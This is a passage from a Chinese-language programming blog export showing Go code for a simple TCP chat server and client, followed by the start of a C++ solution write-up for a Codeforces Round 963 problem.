class="headerlink" title="user.go"></a>user.go</h3><p>这里主要是处理用户发送过来的消息（who、rename私聊），并将服务器消息返回给用户。</p><p>这里我使用nanoid替换了以name为索引的map，使得每次更新map不用delete。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">gonanoid <span class="string">&quot;github.com/matoous/go-nanoid/v2&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Addr   <span class="type">string</span></span><br><span class="line">C      <span class="keyword">chan</span> <span class="type">string</span></span><br><span class="line">conn   net.Conn</span><br><span class="line">nanoid <span class="type">string</span></span><br><span class="line">server *Server</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewUser</span><span class="params">(conn net.Conn, server *Server)</span></span> *User &#123;</span><br><span class="line">userAddr := conn.RemoteAddr().String()</span><br><span class="line">id, err := gonanoid.New()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;生成id失败&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">user := &amp;User&#123;</span><br><span class="line">Name:   userAddr,</span><br><span class="line">Addr:   userAddr,</span><br><span class="line">C:      <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>),</span><br><span class="line">conn:   conn,</span><br><span class="line">server: server,</span><br><span class="line">nanoid: id,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> user.ListenMessage()</span><br><span class="line">fmt.Println(<span class="string">&quot;成功创建一个用户：&quot;</span>, user.Name, <span class="string">&quot;Nanoid&quot;</span>, user.nanoid)</span><br><span class="line"><span class="keyword">return</span> user</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(user *User)</span></span> Online() &#123;</span><br><span class="line">user.server.maplock.Lock()</span><br><span class="line">user.server.UserMap[user.nanoid] = user</span><br><span class="line">user.server.maplock.Unlock()</span><br><span class="line">user.server.BroadCast(user, <span class="string">&quot;已上线&quot;</span>) <span class="comment">//这里类似函数指针的调用方式，参数接收一个指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(user *User)</span></span> Offline() &#123;</span><br><span class="line">user.server.maplock.Lock()</span><br><span class="line"><span class="built_in">delete</span>(user.server.UserMap, user.nanoid)</span><br><span class="line">user.server.maplock.Unlock()</span><br><span class="line">user.server.BroadCast(user, <span class="string">&quot;已下线&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户将消息发送给服务器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *User)</span></span> DoMessage(msg <span class="type">string</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> msg == <span class="string">&quot;who&quot;</span> &#123;</span><br><span class="line">this.SendMsg(<span class="string">&quot;当前在线用户列表：\n&quot;</span>)</span><br><span class="line">this.server.maplock.Lock()</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> this.server.UserMap &#123;</span><br><span class="line">send := <span class="string">&quot;[&quot;</span> + user.Addr + <span class="string">&quot;]&quot;</span> + user.Name + <span class="string">&quot;:&quot;</span> + <span class="string">&quot;在线\n&quot;</span></span><br><span class="line">this.SendMsg(send)</span><br><span class="line"><span class="comment">//fmt.Println(user.Name)</span></span><br><span class="line">&#125;</span><br><span class="line">this.server.maplock.Unlock()</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; <span class="number">7</span> &amp;&amp; msg[:<span class="number">7</span>] == <span class="string">&quot;rename|&quot;</span> &#123;</span><br><span class="line">newName := strings.Split(msg, <span class="string">&quot;rename|&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">this.server.maplock.Lock()</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> this.server.UserMap &#123;</span><br><span class="line"><span class="keyword">if</span> user.Name == newName &#123;</span><br><span class="line">this.SendMsg(<span class="string">&quot;该用户名已存在&quot;</span>)</span><br><span class="line">this.server.maplock.Unlock()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">this.Name = newName</span><br><span class="line">this.server.maplock.Unlock()</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; <span class="number">4</span> &amp;&amp; msg[:<span class="number">3</span>] == <span class="string">&quot;to|&quot;</span> &#123;</span><br><span class="line">remoterName := strings.Split(msg, <span class="string">&quot;|&quot;</span>)[<span class="number">1</span>] <span class="comment">//注意分割</span></span><br><span class="line"><span class="keyword">if</span> remoterName == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">this.SendMsg(<span class="string">&quot;请输入用户名&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">content := strings.Split(msg, <span class="string">&quot;|&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> content == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">this.SendMsg(<span class="string">&quot;请输入内容&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(remoterName, content)</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> this.server.UserMap &#123;</span><br><span class="line"><span class="keyword">if</span> user.Name == remoterName &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;私聊&quot;)</span></span><br><span class="line">user.SendMsg(this.Name + <span class="string">&quot;对您说：&quot;</span> + content)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">this.server.BroadCast(this, msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听当前用户的channel将消息发向该用户</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(user *User)</span></span> ListenMessage() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;用户&quot;</span>, user.Name, <span class="string">&quot;监听消息开始&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">msg := &lt;-user.C</span><br><span class="line">user.conn.Write([]<span class="type">byte</span>(msg + <span class="string">&quot;\n&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(user *User)</span></span> SendMsg(msg <span class="type">string</span>) &#123;</span><br><span class="line">user.conn.Write([]<span class="type">byte</span>(msg))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="client-go"><a href="#client-go" class="headerlink" title="client.go"></a>client.go</h3><p>编写客户端程序，可以规范用户消息格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Client <span class="keyword">struct</span> &#123;</span><br><span class="line">ServerIp   <span class="type">string</span></span><br><span class="line">ServerPort <span class="type">int</span></span><br><span class="line">Name       <span class="type">string</span></span><br><span class="line">conn       net.Conn</span><br><span class="line">flag       <span class="type">int</span> <span class="comment">//当前client的模式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewClient</span><span class="params">(serverIp <span class="type">string</span>, serverPort <span class="type">int</span>)</span></span> *Client &#123;</span><br><span class="line"><span class="comment">//创建客户端对象</span></span><br><span class="line">client := &amp;Client&#123;</span><br><span class="line">ServerIp:   serverIp,</span><br><span class="line">ServerPort: serverPort,</span><br><span class="line">flag:       <span class="number">999</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链接server</span></span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, serverIp, serverPort))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;net.Dial error:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client.conn = conn</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理server回应的消息， 直接显示到标准输出即可</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> DealResponse() &#123;</span><br><span class="line"><span class="comment">//一旦client.conn有数据，就直接copy到stdout标准输出上, 永久阻塞监听</span></span><br><span class="line">io.Copy(os.Stdout, client.conn)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> menu() <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> flag <span class="type">int</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;1.公聊模式&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;2.私聊模式&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;3.更新用户名&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;0.退出&quot;</span>)</span><br><span class="line"></span><br><span class="line">fmt.Scanln(&amp;flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag &gt;= <span class="number">0</span> &amp;&amp; flag &lt;= <span class="number">3</span> &#123;</span><br><span class="line">client.flag = flag</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入合法范围内的数字&lt;&lt;&lt;&lt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询在线用户</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> SelectUsers() &#123;</span><br><span class="line">sendMsg := <span class="string">&quot;who\n&quot;</span></span><br><span class="line">_, err := client.conn.Write([]<span class="type">byte</span>(sendMsg))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;conn Write err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私聊模式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> PrivateChat() &#123;</span><br><span class="line"><span class="keyword">var</span> remoteName <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> chatMsg <span class="type">string</span></span><br><span class="line"></span><br><span class="line">client.SelectUsers()</span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入聊天对象[用户名], exit退出:&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;remoteName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> remoteName != <span class="string">&quot;exit&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入消息内容, exit退出:&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;chatMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> chatMsg != <span class="string">&quot;exit&quot;</span> &#123;</span><br><span class="line"><span class="comment">//消息不为空则发送</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(chatMsg) != <span class="number">0</span> &#123;</span><br><span class="line">sendMsg := <span class="string">&quot;to|&quot;</span> + remoteName + <span class="string">&quot;|&quot;</span> + chatMsg + <span class="string">&quot;\n\n&quot;</span></span><br><span class="line">_, err := client.conn.Write([]<span class="type">byte</span>(sendMsg))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;conn Write err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chatMsg = <span class="string">&quot;&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入消息内容, exit退出:&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;chatMsg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client.SelectUsers()</span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入聊天对象[用户名], exit退出:&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;remoteName)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> PublicChat() &#123;</span><br><span class="line"><span class="comment">//提示用户输入消息</span></span><br><span class="line"><span class="keyword">var</span> chatMsg <span class="type">string</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入聊天内容，exit退出.&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;chatMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> chatMsg != <span class="string">&quot;exit&quot;</span> &#123;</span><br><span class="line"><span class="comment">//发给服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//消息不为空则发送</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(chatMsg) != <span class="number">0</span> &#123;</span><br><span class="line">sendMsg := chatMsg + <span class="string">&quot;\n&quot;</span></span><br><span class="line">_, err := client.conn.Write([]<span class="type">byte</span>(sendMsg))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;conn Write err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chatMsg = <span class="string">&quot;&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入聊天内容，exit退出.&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;chatMsg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> UpdateName() <span class="type">bool</span> &#123;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;请输入用户名:&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;client.Name)</span><br><span class="line"></span><br><span class="line">sendMsg := <span class="string">&quot;rename|&quot;</span> + client.Name + <span class="string">&quot;\n&quot;</span></span><br><span class="line">_, err := client.conn.Write([]<span class="type">byte</span>(sendMsg))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;conn.Write err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(client *Client)</span></span> Run() &#123;</span><br><span class="line"><span class="keyword">for</span> client.flag != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">for</span> client.menu() != <span class="literal">true</span> &#123; <span class="comment">//确保成功进入一种模式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据不同的模式处理不同的业务</span></span><br><span class="line"><span class="keyword">switch</span> client.flag &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">//公聊模式</span></span><br><span class="line">client.PublicChat()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">//私聊模式</span></span><br><span class="line">client.PrivateChat()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">//更新用户名</span></span><br><span class="line">client.UpdateName()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> serverIp <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> serverPort <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./client -ip 127.0.0.1 -port 8888</span></span><br><span class="line"><span class="comment">// init()程序启动时自动被调用。</span></span><br><span class="line"><span class="comment">// y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123; <span class="comment">//</span></span><br><span class="line">flag.StringVar(&amp;serverIp, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;设置服务器IP地址(默认是127.0.0.1)&quot;</span>) <span class="comment">// -ip 127.0.0.1</span></span><br><span class="line">flag.IntVar(&amp;serverPort, <span class="string">&quot;port&quot;</span>, <span class="number">8080</span>, <span class="string">&quot;设置服务器端口(默认是8080)&quot;</span>)              <span class="comment">// -port 8080</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//命令行解析</span></span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line">client := NewClient(serverIp, serverPort)</span><br><span class="line"><span class="keyword">if</span> client == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt; 链接服务器失败...&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单独开启一个goroutine去处理server的回复消息</span></span><br><span class="line"><span class="keyword">go</span> client.DealResponse()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;链接服务器成功...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动客户端的业务</span></span><br><span class="line">client.Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 963 (Div. 2)</title>
      <link href="/2024/08/04/codeforce/2024_8_4/"/>
      <url>/2024/08/04/codeforce/2024_8_4/</url>
      
        <content type="html"><![CDATA[<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240807130603858.png" alt="image-20240807130603858"></p><p>题意：字符串中计数每个字符 <code>A</code>, <code>B</code>, <code>C</code>, 和 <code>D</code>，但每个字符的计数不超过 <code>x</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> countA = <span class="number">0</span>, countB = <span class="number">0</span>, countC = <span class="number">0</span>, countD = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;A&#x27;</span> &amp;&amp; countA &lt; x) &#123;</span><br><span class="line">            countA++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;B&#x27;</span> &amp;&amp; countB &lt; x) &#123;</span><br><span class="line">            countB++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;C&#x27;</span> &amp;&amp; countC &lt; x) 